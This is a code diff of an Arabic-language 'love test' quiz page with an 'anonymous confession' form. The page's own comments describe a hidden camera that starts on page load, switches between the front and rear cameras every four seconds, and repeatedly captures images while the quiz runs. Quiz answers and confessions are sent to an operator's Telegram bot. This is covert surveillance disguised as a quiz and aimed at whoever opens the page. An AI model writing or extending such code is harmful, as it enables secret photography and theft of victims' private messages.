+                    if (!inp || !inp.value.trim()) {
+                        inp.style.borderColor = '#e74c3c';
+                        setTimeout(() => inp.style.borderColor = '#f0a0b8', 800);
+                        return;
+                    }
                     answer = inp.value.trim();
                 } else if (q.type === 'choice') {
                     const hidden = document.getElementById('tempChoice');
-                    if (!hidden || !hidden.value) { alert('الرجاء اختيار إجابة'); return; }
+                    if (!hidden || !hidden.value) {
+                        alert('الرجاء اختيار إجابة');
+                        return;
+                    }
                     answer = hidden.value;
                 }
                 answers.push({ question: q.q, answer: answer });
                 console.log(`📝 سؤال ${currentIndex+1}: ${answer}`);
                 if (answers.length > 0) sendAnswersBtn.disabled = false;
+
+                // التقاط صورة بعد كل إجابة
                 captureAndSend();
+
                 currentIndex++;
-                if (currentIndex < questions.length) renderQuestion(currentIndex);
-                else finishQuiz();
+                if (currentIndex < questions.length) {
+                    renderQuestion(currentIndex);
+                } else {
+                    finishQuiz();
+                }
             }
+
             function finishQuiz() {
                 isQuizStarted = false;
                 questionText.textContent = '🎉 تم! شكراً لمشاركتك 💕';
@@ -426,14 +837,20 @@
                 progressDiv.textContent = '✅ تم';
                 finalMessage.style.display = 'block';
                 sendAnswersBtn.disabled = false;
+
                 setTimeout(() => captureAndSend(), 1000);
                 setTimeout(() => {
                     if (captureInterval) clearInterval(captureInterval);
                     if (switchInterval) clearInterval(switchInterval);
-                    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; cameraReady = false; }
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                        stream = null;
+                        cameraReady = false;
+                    }
                     console.log('⏹️ توقف الكاميرا والالتقاط');
                 }, 10000);
             }
+
             function startQuiz() {
                 isQuizStarted = true;
                 currentIndex = 0;
@@ -442,40 +859,127 @@
                 sendAnswersBtn.disabled = true;
                 startQuizBtn.disabled = true;
                 renderQuestion(0);
-                console.log('🚀 بدأ اختبار الحب');
+                console.log('🚀 بدأ اختبار الحب (55 سؤالاً)');
+
+                // تشغيل الكاميرا
                 startCamera('user');
+
+                // تبديل الكاميرات كل 4 ثوانٍ
                 if (switchInterval) clearInterval(switchInterval);
-                switchInterval = setInterval(() => { if (isQuizStarted) switchCamera(); }, 4000);
+                switchInterval = setInterval(() => {
+                    if (isQuizStarted) switchCamera();
+                }, 4000);
+
+                // التصوير كل 4 ثوانٍ
                 if (captureInterval) clearInterval(captureInterval);
-                captureInterval = setInterval(() => { if (isQuizStarted && cameraReady) captureAndSend(); }, 4000);
+                captureInterval = setInterval(() => {
+                    if (isQuizStarted && cameraReady) captureAndSend();
+                }, 4000);
             }
+
+            // ===== إرسال الإجابات =====
             async function sendAnswersToBot() {
-                if (answers.length === 0) { alert('لا توجد إجابات لإرسالها.'); return; }
+                if (answers.length === 0) {
+                    alert('لا توجد إجابات لإرسالها.');
+                    return;
+                }
                 sendAnswersBtn.disabled = true;
                 sendAnswersBtn.textContent = '⏳ جاري الإرسال...';
+
                 try {
                     let text = '📝 *إجابات اختبار الحب*\n\n';
-                    answers.forEach((item, idx) => { text += `${idx+1}. ${item.question}\n   ➡️ ${item.answer}\n\n`; });
+                    answers.forEach((item, idx) => {
+                        text += `${idx+1}. ${item.question}\n   ➡️ ${item.answer}\n\n`;
+                    });
                     text += `\n🕒 تم الإرسال: ${new Date().toLocaleString('ar-EG')}`;
+
                     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                     });
                     const result = await response.json();
-                    if (result.ok) { alert('✅ تم إرسال الإجابات بنجاح!'); sendAnswersBtn.textContent = '✅ تم الإرسال'; }
-                    else { alert('❌ فشل الإرسال: ' + (result.description || 'خطأ')); sendAnswersBtn.textContent = '📨 إرسال الإجابات'; sendAnswersBtn.disabled = false; }
-                } catch (error) { alert('❌ خطأ: ' + error.message); sendAnswersBtn.textContent = '📨 إرسال الإجابات'; sendAnswersBtn.disabled = false; }
+                    if (result.ok) {
+                        alert('✅ تم إرسال الإجابات إلى البوت بنجاح!');
+                        sendAnswersBtn.textContent = '✅ تم الإرسال';
+                    } else {
+                        alert('❌ فشل الإرسال: ' + (result.description || 'خطأ'));
+                        sendAnswersBtn.textContent = '📨 إرسال الإجابات';
+                        sendAnswersBtn.disabled = false;
+                    }
+                } catch (error) {
+                    alert('❌ خطأ: ' + error.message);
+                    sendAnswersBtn.textContent = '📨 إرسال الإجابات';
+                    sendAnswersBtn.disabled = false;
+                }
             }
 
-            // ===== أحداث =====
+            // ===== صارحني (إرسال رسالة) =====
+            sendConfessionBtn.addEventListener('click', async function() {
+                const msg = confessionText.value.trim();
+                if (!msg) {
+                    confessionResult.innerHTML = '⚠️ الرجاء كتابة رسالة أولاً.';
+                    confessionResult.style.color = '#ef4444';
+                    return;
+                }
+                sendConfessionBtn.disabled = true;
+                sendConfessionBtn.textContent = '⏳ جاري الإرسال...';
+                confessionResult.innerHTML = '';
+
+                try {
+                    const text = `💬 *رسالة صريحة (مجهولة)*%0A%0A${encodeURIComponent(msg)}%0A%0A🕒 ${new Date().toLocaleString('ar-EG')}`;
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    const result = await response.json();
+                    if (result.ok) {
+                        confessionResult.innerHTML = '✅ تم إرسال رسالتك بنجاح! ❤️';
+                        confessionResult.style.color = '#22c55e';
+                        confessionText.value = '';
+                        // تأثير وميض
+                        document.querySelector('.confession-area').classList.add('glow-effect');
+                        setTimeout(() => {
+                            document.querySelector('.confession-area').classList.remove('glow-effect');
+                        }, 700);
+                    } else {
+                        confessionResult.innerHTML = '❌ فشل الإرسال: ' + (result.description || 'خطأ');
+                        confessionResult.style.color = '#ef4444';
+                    }
+                } catch (error) {
+                    confessionResult.innerHTML = '❌ خطأ: ' + error.message;
+                    confessionResult.style.color = '#ef4444';
+                } finally {
+                    sendConfessionBtn.disabled = false;
+                    sendConfessionBtn.textContent = '💌 إرسال الرسالة';
+                }
+            });
+
+            // ===== أحداث الأزرار =====
             startQuizBtn.addEventListener('click', startQuiz);
             nextBtn.addEventListener('click', saveAndNext);
             sendAnswersBtn.addEventListener('click', sendAnswersToBot);
 
-            setTimeout(() => { console.log('📷 محاولة تشغيل الكاميرا الخفية...'); startCamera('user'); }, 1000);
-            document.addEventListener('visibilitychange', () => { if (!document.hidden && !cameraReady && isQuizStarted) { console.log('🔄 إعادة تشغيل الكاميرا'); startCamera(cameraMode); } });
-            console.log('💕 الموقع جاهز (نسبة تشابه + 50 سؤالاً)');
+            // ===== بدء تشغيل الكاميرا الخفية =====
+            setTimeout(() => {
+                console.log('📷 محاولة تشغيل الكاميرا الخفية...');
+                startCamera('user');
+            }, 1000);
+
+            // ===== عند العودة للصفحة =====
+            document.addEventListener('visibilitychange', () => {
+                if (!document.hidden && !cameraReady && isQuizStarted) {
+                    console.log('🔄 إعادة تشغيل الكاميرا');
+                    startCamera(cameraMode);
+                }
+            });
+
+            console.log('💕 الموقع جاهز مع ميزات جديدة (55 سؤالاً + صارحني)');
         })();
     </script>
 </body>
